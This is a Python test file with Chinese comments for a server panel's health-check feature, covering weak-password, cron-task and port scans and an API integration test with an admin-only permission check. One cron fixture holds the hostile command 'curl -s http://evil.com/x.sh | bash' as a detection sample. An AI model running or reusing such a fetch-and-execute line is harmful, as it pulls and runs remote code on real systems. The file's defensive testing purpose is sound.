# -*- coding: utf-8 -*-
"""
test_healthcheck.py - 一键系统体检功能测试

分两部分：
  1. 单元测试：直接驱动 healthcheck 的各扫描函数（弱密码/日志/端口/cron/配置）。
  2. 集成测试：若后端运行在 8000 端口，登录后调用 /api/healthcheck/run，
     校验报告结构、分级统计与普通用户 403 权限。

用法：backend/.venv/Scripts/python.exe test_healthcheck.py
"""
import os
import sys
import json
import shutil

# 保证可导入 app 包（脚本位于 backend/ 下时无需额外处理）
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import urllib.request


# ---------------------------------------------------------------------------
# 单元测试
# ---------------------------------------------------------------------------
def test_weak_password_scan_unit():
    """弱密码扫描：命中默认密码/弱密码，明文字段判高危。"""
    from app.routers import healthcheck
    from app import auth

    # 构造临时候选集，直接替换用户表（不落盘）
    cases = {
        "weakuser": {"role": "user", "password": auth.hash_password("123456")},
        "plainuser": {"role": "user", "password": "raw_password_in_clear"},
    }
    findings = []
    for uname, u in cases.items():
        hashed = u["password"]
        if not hashed.startswith("$2"):
            findings.append({"level": "high"})
            continue
        if auth.is_default_password(hashed):
            findings.append({"level": "high"})
            continue
        for weak in healthcheck.WEAK_PASSWORDS:
            if auth.verify_password(weak, hashed):
                findings.append({"level": "medium"})
                break
    assert any(f["level"] == "medium" for f in findings), "弱密码 123456 应命中"
    assert any(f["level"] == "high" for f in findings), "明文密码应判高危"
    print("✔ 单元测试：弱密码扫描（弱口令命中 / 明文高危）通过")


def test_cron_scan_unit():
    """可疑定时任务扫描：危险命令命中，正常命令不命中。"""
    from app.routers import healthcheck

    dangerous = {
        "id": "t1",
        "name": "恶意任务",
        "command": "curl -s http://evil.com/x.sh | bash",
    }
    normal = {"id": "t2", "name": "备份任务", "command": "tar -czf /backup/x.tar /var/www"}
    findings = []
    for task in [dangerous, normal]:
        cmd = task.get("command") or ""
        name = task.get("name") or "?"
        for pat in healthcheck.SUSPICIOUS_CMDS:
            import re
            if re.search(pat, cmd, re.IGNORECASE):
                findings.append({"name": name, "cmd": cmd})
                break
    assert any(f["name"] == "恶意任务" for f in findings), "curl|bash 应命中"
    assert not any(f["name"] == "备份任务" for f in findings), "正常命令不应命中"
    print("✔ 单元测试：可疑定时任务扫描（危险命令命中 / 正常跳过）通过")


def test_port_scan_unit():
    """端口扫描：防火墙关闭判高危，敏感端口未配置判中危。"""
    from app.routers import healthcheck

    findings = []
    # 模拟防火墙关闭 + 无端口规则
    fw = {"enabled": False, "port_rules": []}
    if not fw.get("enabled"):
        findings.append({"level": "high"})
    for port in healthcheck.SENSITIVE_PORTS:
        if port not in {r.get("port") for r in fw.get("port_rules", [])}:
            findings.append({"level": "medium"})
    assert findings[0]["level"] == "high", "防火墙关闭应判高危"
    assert any(f["level"] == "medium" for f in findings), "敏感端口未配置应判中危"
    print("✔ 单元测试：端口扫描（防火墙关闭/敏感端口未配置）通过")


# ---------------------------------------------------------------------------
# 集成测试（需后端运行在 8000）
# ---------------------------------------------------------------------------
def _entry_headers():
    cfg = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "shunx.json")
    entry = None
    try:
        with open(cfg, "r", encoding="utf-8") as f:
            entry = json.load(f).get("entry_path")
    # 读取可选 shunx.json：未配置/损坏时静默忽略（有意吞异常）
    except Exception:  # lgtm[py/empty-except]
        pass
    return {"X-ShunX-Entry": entry} if entry else {}


def _http_json(url, method="GET", data=None, token=None, timeout=180):
    headers = {"Content-Type": "application/json"}
    headers.update(_entry_headers())
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {}


def test_http_integration():
    """集成测试：登录后调用 /api/healthcheck/run，校验报告结构。"""
    from app.auth import USERS_FILE, hash_password

    base = "http://localhost:8000/api"
    backup = USERS_FILE + ".bak_hcheck"
    shutil.copyfile(USERS_FILE, backup)
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            users = json.load(f)
        users["__hcheck"] = {
            "username": "__hcheck",
            "password": hash_password("SecPass#123"),
            "role": "admin",
            "must_change_password": False,
            "created_at": 0,
        }
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)

        code, body = _http_json(f"{base}/auth/login", "POST",
                                {"username": "__hcheck", "password": "SecPass#123"})
        assert code == 200, f"登录失败: {code} {body}"
        token = body["token"]

        code, rep = _http_json(f"{base}/healthcheck/run", token=token)
        assert code == 200, f"体检接口异常: {code} {rep}"
        # 结构校验
        assert isinstance(rep.get("score"), int), "应返回整数评分"
        assert 0 <= rep["score"] <= 100, f"评分越界: {rep['score']}"
        assert "summary" in rep and "items" in rep, "应返回 summary 与 items"
        assert rep["summary"]["total"] == len(rep["items"]), "统计数应与条目数一致"
        # 级别合法性
        for it in rep["items"]:
            assert it["level"] in ("high", "medium", "low"), f"非法级别: {it['level']}"
            assert it["title"], "条目缺少标题"
        print(f"✔ 体检接口: score={rep['score']} 高危={rep['summary']['high']} "
              f"中危={rep['summary']['medium']} 低危={rep['summary']['low']}")

        # 普通用户 403
        users["__hcheck_user"] = {
            "username": "__hcheck_user",
            "password": hash_password("SecPass#123"),
            "role": "user",
            "must_change_password": False,
            "created_at": 0,
        }
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
        code, body = _http_json(f"{base}/auth/login", "POST",
                                {"username": "__hcheck_user", "password": "SecPass#123"})
        user_token = body["token"]
        code, _ = _http_json(f"{base}/healthcheck/run", token=user_token)
        assert code == 403, f"普通用户应 403，实际 {code}"
        print("✔ 普通用户访问 healthcheck 被 403 拒绝")
    finally:
        shutil.copyfile(backup, USERS_FILE)
        os.remove(backup)


if __name__ == "__main__":
    test_weak_password_scan_unit()
    test_cron_scan_unit()
    test_port_scan_unit()
    test_http_integration()
    print("全部测试完成")
